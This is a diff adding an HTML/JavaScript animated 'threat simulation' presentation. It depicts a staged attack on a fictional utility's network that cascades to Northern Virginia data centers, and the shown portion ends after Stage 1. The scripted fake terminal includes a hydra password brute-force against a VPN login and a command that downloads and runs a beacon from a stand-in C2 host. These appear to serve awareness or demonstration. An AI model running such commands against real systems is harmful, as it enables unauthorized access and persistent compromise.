@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Royal Duke — Threat Simulation</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;background:#080c14;overflow:hidden;user-select:none;cursor:default}
+
+/* ── LAYOUT ── */
+#main{display:flex;height:100vh;padding:14px;gap:14px}
+#map-panel{flex:1.35;position:relative;min-width:0;border-radius:8px;overflow:hidden;border:1px solid rgba(30,41,59,.25)}
+#map-panel canvas{display:block;width:100%;height:100%}
+#term-panel{flex:1;display:flex;flex-direction:column;min-width:0;
+  opacity:0;transform:translateX(20px);
+  transition:opacity .8s ease,transform .8s ease;pointer-events:none}
+#term-panel.vis{opacity:1;transform:translateX(0);pointer-events:auto}
+
+/* ── TERMINAL CHROME ── */
+.term-bar{height:34px;background:#161b22;border-radius:8px 8px 0 0;display:flex;align-items:center;padding:0 14px;gap:8px;border:1px solid rgba(30,41,59,.45);border-bottom:none;flex-shrink:0}
+.term-dots{display:flex;gap:6px}
+.term-dots span{width:11px;height:11px;border-radius:50%}
+.term-dots span:nth-child(1){background:#ef4444}
+.term-dots span:nth-child(2){background:#f59e0b}
+.term-dots span:nth-child(3){background:#22c55e}
+.term-title{flex:1;text-align:center;font:500 11px 'SF Mono','JetBrains Mono','Fira Code',monospace;color:rgba(148,163,184,.5);letter-spacing:1.5px}
+
+#term-body{flex:1;background:#0d1117;border:1px solid rgba(30,41,59,.45);border-top:none;border-radius:0 0 8px 8px;overflow-y:auto;padding:14px 16px;position:relative;transition:border-color .5s,box-shadow .5s}
+#term-body.alert{border-color:rgba(239,68,68,.3);box-shadow:inset 0 0 60px rgba(239,68,68,.05)}
+#term-body::-webkit-scrollbar{width:4px}
+#term-body::-webkit-scrollbar-track{background:transparent}
+#term-body::-webkit-scrollbar-thumb{background:rgba(51,65,85,.35);border-radius:2px}
+
+.tl{font:13px/1.7 'SF Mono','JetBrains Mono','Fira Code',monospace;white-space:pre-wrap;word-break:break-all;min-height:.4em}
+.prompt{color:#4ade80}
+.cmd{color:#e2e8f0}
+.out{color:#94a3b8}
+.warn{color:#f59e0b}
+.err{color:#ef4444}
+.info{color:#38bdf8}
+.success{color:#4ade80}
+.dim{color:rgba(148,163,184,.3)}
+.comment{color:#6b7280;font-style:italic}
+.header{color:#c084fc;font-weight:bold}
+
+#cursor{display:inline;color:#4ade80;animation:blink 1s step-end infinite;font-size:13px;line-height:1}
+@keyframes blink{50%{opacity:0}}
+
+/* ── VIGNETTE ── */
+.vig-t,.vig-b{position:fixed;left:0;right:0;pointer-events:none;z-index:2}
+.vig-t{top:0;height:60px;background:linear-gradient(to bottom,rgba(8,12,20,.75),transparent)}
+.vig-b{bottom:0;height:50px;background:linear-gradient(to top,rgba(8,12,20,.65),transparent)}
+
+/* ── HUD ── */
+.hud{position:fixed;z-index:3;font-family:'SF Mono','JetBrains Mono','Fira Code',monospace;pointer-events:none}
+#hud-tl{top:20px;left:24px;font-size:10px;letter-spacing:2.5px;color:rgba(148,163,184,.32);line-height:1.7}
+#hud-tr{top:20px;right:24px;font-size:11px;letter-spacing:2px;color:rgba(148,163,184,.25);text-align:right}
+#hud-br{bottom:20px;left:14px;width:calc(57.5% - 7px);text-align:center;font-size:10px;letter-spacing:1.5px;color:rgba(148,163,184,.18);transition:opacity 1.5s}
+
+/* ── PROGRESS DOTS ── */
+#progress{position:fixed;bottom:18px;left:14px;width:calc(57.5% - 7px);display:flex;justify-content:center;gap:10px;z-index:3}
+#progress .dot{width:7px;height:7px;border-radius:50%;background:rgba(51,65,85,.45);transition:all .5s}
+#progress .dot.done{background:rgba(239,68,68,.45)}
+#progress .dot.active{background:#ef4444;box-shadow:0 0 10px rgba(239,68,68,.45)}
+
+/* ── STAGE TITLE ── */
+#stage-title{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;z-index:5;pointer-events:none;opacity:0;transition:opacity .8s}
+#stage-title .num{font-family:'SF Mono','JetBrains Mono',monospace;font-size:12px;letter-spacing:5px;color:rgba(239,68,68,.6);margin-bottom:6px}
+#stage-title .name{font-family:'Inter',-apple-system,system-ui,sans-serif;font-size:34px;font-weight:700;color:#f1f5f9;letter-spacing:1px}
+#stage-title .sub{font-family:'Inter',-apple-system,system-ui,sans-serif;font-size:13px;color:rgba(148,163,184,.5);margin-top:8px;letter-spacing:1px}
+#stage-title.vis{opacity:1}
+
+/* ── CASCADE OVERLAY ── */
+#cascade{position:fixed;inset:0;z-index:10;background:rgba(8,12,20,.92);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity 1s}
+#cascade.vis{opacity:1;pointer-events:auto}
+#cascade .inner{text-align:center;max-width:640px;font-family:'Inter',-apple-system,system-ui,sans-serif}
+#cascade .big{font-size:68px;font-weight:800;color:#ef4444;text-shadow:0 0 60px rgba(239,68,68,.25)}
+#cascade .cap{font-size:13px;color:rgba(148,163,184,.45);letter-spacing:2px;margin:8px 0 32px;text-transform:uppercase}
+#cascade .row{display:flex;gap:14px;margin-bottom:28px}
+#cascade .card{flex:1;background:rgba(17,24,39,.8);border:1px solid rgba(30,41,59,.5);border-radius:8px;padding:18px 10px}
+#cascade .card .n{font-size:26px;font-weight:700;color:#ef4444;margin-bottom:4px}
+#cascade .card .l{font-size:11px;color:rgba(148,163,184,.4);line-height:1.5}
+#cascade .foot{font-size:12px;color:rgba(148,163,184,.3);line-height:1.7}
+#cascade .close{margin-top:20px;background:none;border:1px solid rgba(51,65,85,.5);color:rgba(148,163,184,.35);padding:7px 22px;border-radius:5px;font-size:11px;cursor:pointer;font-family:inherit;letter-spacing:1px;transition:all .3s}
+#cascade .close:hover{border-color:rgba(148,163,184,.4);color:rgba(148,163,184,.6)}
+</style>
+</head>
+<body>
+
+<div class="vig-t"></div>
+<div class="vig-b"></div>
+
+<div class="hud" id="hud-tl">THREAT SIMULATION<br>ROYAL DUKE INFRASTRUCTURE GROUP</div>
+<div class="hud" id="hud-tr"><span id="stage-counter">NORMAL OPERATIONS</span></div>
+<div class="hud" id="hud-br">SPACE TO ADVANCE</div>
+
+<div id="progress"></div>
+
+<div id="stage-title">
+  <div class="num"></div>
+  <div class="name"></div>
+  <div class="sub"></div>
+</div>
+
+<div id="cascade">
+  <div class="inner">
+    <div class="big">4,140 MW</div>
+    <div class="cap">of server capacity at risk across Northern Virginia</div>
+    <div class="row">
+      <div class="card"><div class="n">$1M+</div><div class="l">per hour per facility<br>downstream losses</div></div>
+      <div class="card"><div class="n">300+</div><div class="l">data center facilities<br>in Loudoun County alone</div></div>
+      <div class="card"><div class="n">95%</div><div class="l">of Fortune 500 rely on<br>third-party DCs here</div></div>
+    </div>
+    <div class="foot">Thermal safety systems force hard shutdowns.<br>Cloud, AI, federal, and financial platforms go offline simultaneously.</div>
+    <button class="close" onclick="closeCascade()">CLOSE</button>
+  </div>
+</div>
+
+<div id="main">
+  <div id="map-panel">
+    <canvas id="c"></canvas>
+  </div>
+  <div id="term-panel">
+    <div class="term-bar">
+      <div class="term-dots"><span></span><span></span><span></span></div>
+      <div class="term-title" id="term-title">terminal</div>
+    </div>
+    <div id="term-body">
+      <div id="term-lines"></div>
+      <span id="cursor">&#x2588;</span>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════
+//  CANVAS SETUP
+// ═══════════════════════════════════════════════
+const canvas = document.getElementById('c');
+const ctx = canvas.getContext('2d');
+let W, H, dpr;
+
+function resize() {
+  const panel = document.getElementById('map-panel');
+  dpr = window.devicePixelRatio || 1;
+  W = panel.clientWidth;
+  H = panel.clientHeight;
+  canvas.width = W * dpr;
+  canvas.height = H * dpr;
+  canvas.style.width = W + 'px';
+  canvas.style.height = H + 'px';
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+}
+window.addEventListener('resize', resize);
+resize();
+
+// ═══════════════════════════════════════════════
+//  CAMERA SYSTEM
+// ═══════════════════════════════════════════════
+// Camera target per stage: { cx, cy, zoom }
+// cx,cy = virtual coord center (0-100), zoom = scale multiplier
+const CAM_TARGETS = [
+  { cx:45, cy:48, zoom:1.0  },  // S0: full overview
+  { cx:18, cy:40, zoom:1.8  },  // S1: vendor → HQ
+  { cx:38, cy:38, zoom:1.6  },  // S2: HQ expanding into OT
+  { cx:34, cy:40, zoom:2.3  },  // S3: tight on HQ (illusion)
+  { cx:42, cy:48, zoom:1.4  },  // S4: HQ → infra spread
+  { cx:45, cy:48, zoom:1.0  },  // S5: full zoom out — blackout
+];
+
+let cam = { cx:45, cy:48, zoom:1.0 };
+let camTarget = { cx:45, cy:48, zoom:1.0 };
+
+function lerpCam(dt) {
+  const s = 1 - Math.pow(0.04, dt); // smooth damp
+  cam.cx   += (camTarget.cx - cam.cx) * s;
+  cam.cy   += (camTarget.cy - cam.cy) * s;
+  cam.zoom += (camTarget.zoom - cam.zoom) * s;
+}
+
+// Transform virtual coord → screen pixel with camera
+const BASE_PX = 40, BASE_PY = 50;
+function mx(v) {
+  const raw = BASE_PX + (v / 100) * (W - BASE_PX * 2);
+  const center = W / 2;
+  return center + (raw - (BASE_PX + (cam.cx / 100) * (W - BASE_PX * 2))) * cam.zoom;
+}
+function my(v) {
+  const raw = BASE_PY + (v / 100) * (H - BASE_PY * 2);
+  const center = H / 2;
+  return center + (raw - (BASE_PY + (cam.cy / 100) * (H - BASE_PY * 2))) * cam.zoom;
+}
+// Scale factor — for radius/font sizing relative to zoom
+function sc(v) { return v * cam.zoom; }
+
+// ═══════════════════════════════════════════════
+//  MAP DATA
+// ═══════════════════════════════════════════════
+const counties = [
+  { name:'LOUDOUN COUNTY', lx:22, ly:32,
+    pts:[[6,6],[40,4],[47,18],[48,44],[42,52],[24,55],[8,44],[4,24]] },
+  { name:'FAIRFAX COUNTY', lx:66, ly:30,
+    pts:[[47,18],[48,44],[42,52],[54,62],[76,56],[90,36],[86,14],[64,6]] },
+  { name:'PRINCE WILLIAM COUNTY', lx:46, ly:74,
+    pts:[[24,55],[42,52],[54,62],[76,56],[78,76],[62,92],[38,92],[20,74]] },
+];
+
+const nodes = [
+  { id:'vendor', x:5,   y:38, r:5,  label:'VENDOR\nPORTAL',      color:'#64748b' },
+  { id:'hq',     x:34,  y:40, r:10, label:'ROYAL DUKE\nHQ / EMS', color:'#3b82f6' },
+  { id:'sub_a',  x:22,  y:20, r:7,  label:'SUBSTATION\nASHBURN',  color:'#3b82f6' },
+  { id:'sub_s',  x:50,  y:70, r:7,  label:'SUBSTATION\nSOUTH',    color:'#3b82f6' },
+  { id:'water',  x:60,  y:50, r:7,  label:'WATER\nTREATMENT',     color:'#06b6d4' },
+];
+
+const dcClusters = [
+  { id:'ash', cx:18, cy:14, label:'ASHBURN DC CAMPUS',
+    dots:[[16,11],[19,9],[22,12],[18,16],[21,18],[24,10]] },
+  { id:'man', cx:44, cy:82, label:'MANASSAS DC CAMPUS',
+    dots:[[42,80],[45,78],[43,84],[47,82]] },
+  { id:'tys', cx:72, cy:24, label:'TYSONS DC CAMPUS',
+    dots:[[69,21],[72,19],[75,23],[71,27],[68,25]] },
+];
+
+const infraEdges = [['hq','sub_a'],['hq','sub_s'],['hq','water']];
+const supplyEdges = [
+  {f:'sub_a',t:'ash'},{f:'sub_s',t:'man'},
+  {f:'water',t:'ash'},{f:'water',t:'man'},{f:'water',t:'tys'},
+];
+
+// ═══════════════════════════════════════════════
+//  STAGE METADATA
+// ═══════════════════════════════════════════════
+const STAGES = [
+  {num:'',title:'',sub:''},
+  {num:'STAGE 1',title:'THE OPEN WINDOW',sub:'The Breach'},
+  {num:'STAGE 2',title:'THE PIVOT',sub:'Crossing the IT / OT Wall'},
+  {num:'STAGE 3',title:'THE ILLUSION',sub:'Situational Awareness Lost'},
+  {num:'STAGE 4',title:'THE PHYSICS BREACH',sub:'When Code Becomes Kinetic'},
+  {num:'STAGE 5',title:'THE FALLOUT',sub:'The Cloud Goes Dark'},
+];
+
+const TTITLES = [
+  'system@RDIG-MONITOR','attacker@kali ~','admin@RDIG-DC01 ~',
+  'attacker@kali ~','attacker@kali ~','SCADA ALERT MONITOR'
+];
+
+// ═══════════════════════════════════════════════
+//  STATE
+// ═══════════════════════════════════════════════
+let stage   = 0;
+let stageT  = 0;
+let globalT = 0;
+let lastTs  = 0;
+
+function nd(id)  { return nodes.find(n => n.id === id); }
+function cl(id)  { return dcClusters.find(c => c.id === id); }
+function ease(t) { return t < .5 ? 4*t*t*t : 1 - Math.pow(-2*t+2, 3)/2; }
+function c01(t)  { return Math.max(0, Math.min(1, t)); }
+function ha(hex, a) {
+  return 'rgba('+parseInt(hex.slice(1,3),16)+','+parseInt(hex.slice(3,5),16)+','+parseInt(hex.slice(5,7),16)+','+a+')';
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — BACKGROUND
+// ═══════════════════════════════════════════════
+function drawBg() {
+  ctx.fillStyle = '#080c14';
+  ctx.fillRect(0, 0, W, H);
+  const sp = 34 * cam.zoom;
+  if (sp > 8) {
+    ctx.fillStyle = 'rgba(30,41,59,0.18)';
+    const offX = mx(0) % sp, offY = my(0) % sp;
+    for (let x = offX; x < W; x += sp)
+      for (let y = offY; y < H; y += sp)
+        ctx.fillRect(x, y, 1, 1);
+  }
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — COUNTIES
+// ═══════════════════════════════════════════════
+function drawCounties() {
+  counties.forEach(c => {
+    ctx.beginPath();
+    c.pts.forEach((p, i) => {
+      i === 0 ? ctx.moveTo(mx(p[0]), my(p[1])) : ctx.lineTo(mx(p[0]), my(p[1]));
+    });
+    ctx.closePath();
+    ctx.fillStyle = 'rgba(15,23,42,0.45)';
+    ctx.fill();
+    ctx.strokeStyle = 'rgba(30,58,95,0.35)';
+    ctx.lineWidth = sc(1);
+    ctx.stroke();
+    const fs = Math.max(9, sc(12));
+    ctx.font = '600 ' + fs + 'px Inter,-apple-system,system-ui,sans-serif';
+    ctx.fillStyle = 'rgba(71,85,105,0.22)';
+    ctx.textAlign = 'center';
+    ctx.fillText(c.name, mx(c.lx), my(c.ly));
+  });
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — EDGES
+// ═══════════════════════════════════════════════
+function drawEdges() {
+  infraEdges.forEach(([a, b]) => {
+    const na = nd(a), nb = nd(b);
+    ctx.beginPath();
+    ctx.moveTo(mx(na.x), my(na.y));
+    ctx.lineTo(mx(nb.x), my(nb.y));
+    ctx.strokeStyle = 'rgba(51,65,85,0.28)';
+    ctx.lineWidth = sc(1);
+    ctx.stroke();
+  });
+  supplyEdges.forEach(e => {
+    const n = nd(e.f), c = cl(e.t);
+    ctx.beginPath();
+    ctx.moveTo(mx(n.x), my(n.y));
+    ctx.lineTo(mx(c.cx), my(c.cy));
+    ctx.strokeStyle = 'rgba(51,65,85,0.12)';
+    ctx.lineWidth = sc(.5);
+    ctx.stroke();
+  });
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — IT/OT BOUNDARY
+// ═══════════════════════════════════════════════
+function drawBoundary() {
+  if (stage < 2) return;
+  const x1 = mx(8), x2 = mx(82), y = my(35);
+  ctx.setLineDash([sc(6), sc(4)]);
+  ctx.strokeStyle = 'rgba(239,68,68,0.14)';
+  ctx.lineWidth = sc(1);
+  ctx.beginPath(); ctx.moveTo(x1, y); ctx.lineTo(x2, y); ctx.stroke();
+  ctx.setLineDash([]);
+  const fs = Math.max(7, sc(9));
+  ctx.font = '600 ' + fs + 'px "SF Mono","JetBrains Mono",monospace';
+  ctx.fillStyle = 'rgba(239,68,68,0.22)';
+  ctx.textAlign = 'center';
+  ctx.fillText('IT / OT BOUNDARY \u2014 BREACHED', mx(45), y - sc(6));
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — NODES
+// ═══════════════════════════════════════════════
+function nodeCol(n) {
+  if (n.id === 'vendor' && stage >= 1) return '#ef4444';
+  if (n.id === 'hq' && stage >= 1) return '#ef4444';
+  if ((n.id === 'sub_a' || n.id === 'sub_s' || n.id === 'water') && stage >= 4) return '#ef4444';
+  return n.color;
+}
+
+function drawNodes() {
+  nodes.forEach(n => {
+    const sx = mx(n.x), sy = my(n.y);
+    const r = sc(n.r);
+    const col = nodeCol(n);
+    const red = col === '#ef4444';
+    const br = 0.92 + Math.sin(globalT * 1.5 + n.x * .3) * .08;
+
+    if (n.id === 'hq' && stage === 3) { drawIllusion(sx, sy, r); drawLbl(sx, sy + r + sc(14), n.label); return; }
+
+    // glow
+    const g = ctx.createRadialGradient(sx, sy, 0, sx, sy, r * 3.5);
+    g.addColorStop(0, ha(col, red ? .28 : .14));
+    g.addColorStop(1, ha(col, 0));
+    ctx.fillStyle = g; ctx.beginPath(); ctx.arc(sx, sy, r * 3.5, 0, Math.PI * 2); ctx.fill();
+
+    // pulse ring
+    if (red) {
+      const pr = r + sc(6) + Math.sin(globalT * 3) * sc(4);
+      ctx.strokeStyle = ha('#ef4444', .2 + Math.sin(globalT * 3) * .1);
+      ctx.lineWidth = sc(1.5);
+      ctx.beginPath(); ctx.arc(sx, sy, pr, 0, Math.PI * 2); ctx.stroke();
+    }
+
+    // core
+    ctx.fillStyle = ha(col, br);
+    ctx.beginPath(); ctx.arc(sx, sy, r, 0, Math.PI * 2); ctx.fill();
+    ctx.strokeStyle = ha(col, .5);
+    ctx.lineWidth = sc(1.5);
+    ctx.beginPath(); ctx.arc(sx, sy, r + sc(2), 0, Math.PI * 2); ctx.stroke();
+
+    drawLbl(sx, sy + r + sc(14), n.label);
+  });
+}
+
+function drawIllusion(sx, sy, r) {
+  const glitch = Math.sin(globalT * 9) > .88;
+  const gp = .28 + Math.sin(globalT * 2) * .12;
+  if (!glitch) {
+    const gg = ctx.createRadialGradient(sx, sy, r, sx, sy, r * 4);
+    gg.addColorStop(0, 'rgba(34,197,94,' + gp + ')');
+    gg.addColorStop(1, 'rgba(34,197,94,0)');
+    ctx.fillStyle = gg; ctx.beginPath(); ctx.arc(sx, sy, r * 4, 0, Math.PI * 2); ctx.fill();
+    ctx.strokeStyle = 'rgba(34,197,94,' + (gp + .15) + ')';
+    ctx.lineWidth = sc(2.5); ctx.beginPath(); ctx.arc(sx, sy, r + sc(2), 0, Math.PI * 2); ctx.stroke();
+  }
+  ctx.fillStyle = glitch ? '#ef4444' : 'rgba(239,68,68,0.68)';
+  ctx.beginPath(); ctx.arc(sx, sy, r * .65, 0, Math.PI * 2); ctx.fill();
+  if (glitch) {
+    ctx.strokeStyle = '#ef4444'; ctx.lineWidth = sc(2.5);
+    ctx.beginPath(); ctx.arc(sx, sy, r + sc(2), 0, Math.PI * 2); ctx.stroke();
+    const rg = ctx.createRadialGradient(sx, sy, 0, sx, sy, r * 4);
+    rg.addColorStop(0, 'rgba(239,68,68,0.28)');
+    rg.addColorStop(1, 'rgba(239,68,68,0)');
+    ctx.fillStyle = rg; ctx.beginPath(); ctx.arc(sx, sy, r * 4, 0, Math.PI * 2); ctx.fill();
+  }
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — DATA CENTERS
+// ═══════════════════════════════════════════════
+function dcOp(cluster, i) {
+  if (stage < 5) return 1;
+  const d = {ash:0, man:.3, tys:.6}[cluster.id] || 0;
+  return 1 - c01((stageT - 1.5 - d - i * .08) / .4);
+}
+function dcFlash(cluster, i) {
+  if (stage < 5) return false;
+  const d = {ash:0, man:.3, tys:.6}[cluster.id] || 0;
+  const t = stageT - 1.5 - d - i * .08;
+  return t > -.1 && t < .15;
+}
+
+function drawDCs() {
+  dcClusters.forEach(cluster => {
+    cluster.dots.forEach((d, i) => {
+      const sx = mx(d[0]), sy = my(d[1]);
+      const op = dcOp(cluster, i);
+      const fl = dcFlash(cluster, i);
+      const br = .85 + Math.sin(globalT * 1.2 + i * 1.1) * .15;
+      if (fl) {
+        const fg = ctx.createRadialGradient(sx, sy, 0, sx, sy, sc(18));
+        fg.addColorStop(0, 'rgba(239,68,68,0.55)');
+        fg.addColorStop(1, 'rgba(239,68,68,0)');
+        ctx.fillStyle = fg; ctx.beginPath(); ctx.arc(sx, sy, sc(18), 0, Math.PI * 2); ctx.fill();
+      }
+      if (op > .02) {
+        const g = ctx.createRadialGradient(sx, sy, 0, sx, sy, sc(12));
+        g.addColorStop(0, 'rgba(6,182,212,' + (.12 * op * br) + ')');
+        g.addColorStop(1, 'rgba(6,182,212,0)');
+        ctx.fillStyle = g; ctx.beginPath(); ctx.arc(sx, sy, sc(12), 0, Math.PI * 2); ctx.fill();
+        ctx.fillStyle = 'rgba(6,182,212,' + (op * br * .9) + ')';
+        ctx.beginPath(); ctx.arc(sx, sy, sc(3.5), 0, Math.PI * 2); ctx.fill();
+      } else {
+        ctx.fillStyle = 'rgba(30,41,59,0.25)';
+        ctx.beginPath(); ctx.arc(sx, sy, sc(2.5), 0, Math.PI * 2); ctx.fill();
+      }
+    });
+    const fs = Math.max(7, sc(9));
+    ctx.font = '600 ' + fs + 'px "SF Mono","JetBrains Mono",monospace';
+    ctx.fillStyle = (stage >= 5 && stageT > 3) ? 'rgba(148,163,184,0.06)' : 'rgba(148,163,184,0.28)';
+    ctx.textAlign = 'center';
+    ctx.fillText(cluster.label, mx(cluster.cx), my(cluster.cy) + (cluster.id === 'man' ? sc(28) : sc(-18)));
+  });
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — ATTACK PATHS
+// ═══════════════════════════════════════════════
+function drawAttack() {
+  if (stage < 1) return;
+  if (stage >= 1) trace(nd('vendor'), nd('hq'), stage === 1 ? c01(stageT / 2) : 1, stage > 1);
+  if (stage === 2) {
+    const p = c01(stageT / 1.5);
+    const sx = mx(34), sy = my(40), r = sc(8) + ease(p) * sc(30);
+    ctx.strokeStyle = 'rgba(239,68,68,' + (.3 * (1 - p * .5)) + ')';
+    ctx.lineWidth = sc(1.5);
+    ctx.beginPath(); ctx.arc(sx, sy, r, 0, Math.PI * 2); ctx.stroke();
+  }
+  if (stage >= 4) {
+    const p = stage === 4 ? c01(stageT / 2) : 1;
+    trace(nd('hq'), nd('sub_a'), p, stage > 4);
+    trace(nd('hq'), nd('sub_s'), p, stage > 4);
+    trace(nd('hq'), nd('water'), p, stage > 4);
+  }
+  if (stage >= 5) {
+    const p = c01(stageT / 2);
+    traceCl(nd('sub_a'), cl('ash'), p);
+    traceCl(nd('sub_s'), cl('man'), p);
+    traceCl(nd('water'), cl('tys'), p);
+  }
+}
+
+function trace(from, to, progress, done) {
+  const sx = mx(from.x), sy = my(from.y);
+  const ex = mx(to.x), ey = my(to.y);
+  const p = ease(progress);
+  const cx = sx + (ex - sx) * p, cy = sy + (ey - sy) * p;
+  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(cx, cy);
+  ctx.strokeStyle = 'rgba(239,68,68,0.5)'; ctx.lineWidth = sc(2); ctx.stroke();
+  ctx.strokeStyle = 'rgba(239,68,68,0.07)'; ctx.lineWidth = sc(10); ctx.stroke();
+  if (progress < 1) {
+    const hg = ctx.createRadialGradient(cx, cy, 0, cx, cy, sc(14));
+    hg.addColorStop(0, 'rgba(239,68,68,0.7)');
+    hg.addColorStop(1, 'rgba(239,68,68,0)');
+    ctx.fillStyle = hg; ctx.beginPath(); ctx.arc(cx, cy, sc(14), 0, Math.PI * 2); ctx.fill();
+    ctx.fillStyle = '#ef4444'; ctx.beginPath(); ctx.arc(cx, cy, sc(3), 0, Math.PI * 2); ctx.fill();
+  }
+  if (done || progress >= 1) {
+    for (let i = 0; i < 4; i++) {
+      const t = ((globalT * .35 + i * .25) % 1);
+      const px = sx + (ex - sx) * t, py = sy + (ey - sy) * t;
+      ctx.fillStyle = 'rgba(239,68,68,' + (.6 - t * .3) + ')';
+      ctx.beginPath(); ctx.arc(px, py, sc(2), 0, Math.PI * 2); ctx.fill();
+    }
+  }
+}
+
+function traceCl(node, cluster, progress) {
+  const sx = mx(node.x), sy = my(node.y);
+  const ex = mx(cluster.cx), ey = my(cluster.cy);
+  const p = ease(progress);
+  const cx = sx + (ex - sx) * p, cy = sy + (ey - sy) * p;
+  ctx.beginPath(); ctx.moveTo(sx, sy); ctx.lineTo(cx, cy);
+  ctx.strokeStyle = 'rgba(239,68,68,0.35)'; ctx.lineWidth = sc(1.5); ctx.stroke();
+  ctx.strokeStyle = 'rgba(239,68,68,0.05)'; ctx.lineWidth = sc(8); ctx.stroke();
+  if (progress < 1) {
+    const hg = ctx.createRadialGradient(cx, cy, 0, cx, cy, sc(10));
+    hg.addColorStop(0, 'rgba(239,68,68,0.6)');
+    hg.addColorStop(1, 'rgba(239,68,68,0)');
+    ctx.fillStyle = hg; ctx.beginPath(); ctx.arc(cx, cy, sc(10), 0, Math.PI * 2); ctx.fill();
+  }
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — LABELS
+// ═══════════════════════════════════════════════
+function drawLbl(x, y, text) {
+  const fs = Math.max(8, sc(10));
+  ctx.font = '600 ' + fs + 'px "SF Mono","JetBrains Mono",monospace';
+  ctx.fillStyle = 'rgba(203,213,225,0.55)';
+  ctx.textAlign = 'center';
+  text.split('\n').forEach((l, i) => ctx.fillText(l, x, y + i * (fs + 2)));
+}
+
+// ═══════════════════════════════════════════════
+//  DRAW — STAGE 5 MAP DIM
+// ═══════════════════════════════════════════════
+function drawDim() {
+  if (stage < 5) return;
+  const d = c01((stageT - 3) / 2);
+  if (d > 0) { ctx.fillStyle = 'rgba(8,12,20,' + (d * .35) + ')'; ctx.fillRect(0, 0, W, H); }
+}
+
+// ═══════════════════════════════════════════════
+//  TERMINAL — EXPANDED CONTENT PER STAGE
+// ═══════════════════════════════════════════════
+const TERM = [
+  // ── Stage 0 ──
+  [],
+
+  // ═════════════════════════════════════════════
+  //  Stage 1: THE OPEN WINDOW — VPN Credential Breach
+  // ═════════════════════════════════════════════
+  [
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  PHASE 1: Initial Access via Vendor VPN', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\', prompt:'attacker@kali:~$'},
+    {out:'    vpn.royalduke.com https-post-form \\', c:'cmd'},
+    {out:'    "/login:user=^USER^&pass=^PASS^:F=Invalid"', c:'cmd'},
+    {gap:1100},
+    {out:'Hydra v9.5 (c) 2023 by van Hauser / THC'},
+    {out:'[DATA] max 16 tasks per 1 server, 14344391 login tries'},
+    {out:'[DATA] attacking http-post-form://vpn.royalduke.com:443'},
+    {out:'[STATUS] 128.00 tries/min, 1024 tries in 00:08h', c:'dim'},
+    {out:'[STATUS] 256.00 tries/min, 3072 tries in 00:12h', c:'dim'},
+    {gap:500},
+    {out:''},
+    {out:'[443][http-post-form] host: vpn.royalduke.com', c:'success'},
+    {out:'    login: admin    password: Duke2024!', c:'success'},
+    {out:'1 of 1 target successfully completed, 1 valid password found', c:'success'},
+    {gap:800},
+    {out:''},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  Establishing foothold on internal network', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'ssh admin@10.10.1.5', prompt:'attacker@kali:~$'},
+    {gap:600},
+    {out:'The authenticity of host \'10.10.1.5\' can\'t be established.', c:'dim'},
+    {out:'ECDSA key fingerprint is SHA256:aB3x...Kf9w.', c:'dim'},
+    {out:'Are you sure you want to continue? (yes/no): yes', c:'dim'},
+    {out:'Password: ********', c:'dim'},
+    {gap:400},
+    {out:'Welcome to Ubuntu 20.04.6 LTS (RDIG-DC01)', c:'info'},
+    {out:'Last login: Mon Mar 24 02:14:33 2026 from 10.10.1.1'},
+    {gap:400},
+    {out:''},
+    {cmd:'whoami && hostname && id', prompt:'admin@RDIG-DC01:~$'},
+    {gap:250},
+    {out:'admin'},
+    {out:'RDIG-DC01'},
+    {out:'uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo),999(domain-admins)', c:'warn'},
+    {gap:400},
+    {out:''},
+    {cmd:'ifconfig eth0 | head -3', prompt:'admin@RDIG-DC01:~$'},
+    {gap:200},
+    {out:'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500'},
+    {out:'        inet 10.10.1.5  netmask 255.255.255.0  broadcast 10.10.1.255'},
+    {out:'        inet6 fe80::a00:27ff:fe4e:1234  prefixlen 64  scopeid 0x20'},
+    {gap:400},
+    {out:''},
+    {cmd:'net view /domain', prompt:'admin@RDIG-DC01:~$'},
+    {gap:450},
+    {out:'Server Name             Remark'},
+    {out:'─────────────────────────────────────────', c:'dim'},
+    {out:'\\\\RDIG-DC01             Domain Controller'},
+    {out:'\\\\RDIG-SCADA01          SCADA Primary Server'},
+    {out:'\\\\RDIG-HMI01            HMI Workstation'},
+    {out:'\\\\RDIG-HIST01           Historian / Data Logger'},
+    {out:'\\\\RDIG-EWS01            Engineering Workstation'},
+    {out:'The command completed successfully.'},
+    {gap:500},
+    {out:''},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:'#  Installing persistence — C2 beacon', c:'comment'},
+    {out:'# ──────────────────────────────────────────────', c:'dim'},
+    {out:''},
+    {cmd:'mkdir -p /tmp/.rdg && curl -sL http://c2.srv/beacon -o /tmp/.rdg/svc', prompt:'admin@RDIG-DC01:~$'},
+    {gap:250},
+    {cmd:'chmod +x /tmp/.rdg/svc && nohup /tmp/.rdg/svc > /dev/null 2>&1 &', prompt:'admin@RDIG-DC01:~$'},
+    {gap:600},
+    {out:'[+] Beacon: RDIG-DC01 → C2 callback established (60s interval)', c:'success'},
+    {out:'[+] Persistence: cron job installed as admin', c:'success'},
+    {out:'[+] Session ID: 0x4A7F — ready for lateral movement', c:'success'},
+  ],
+
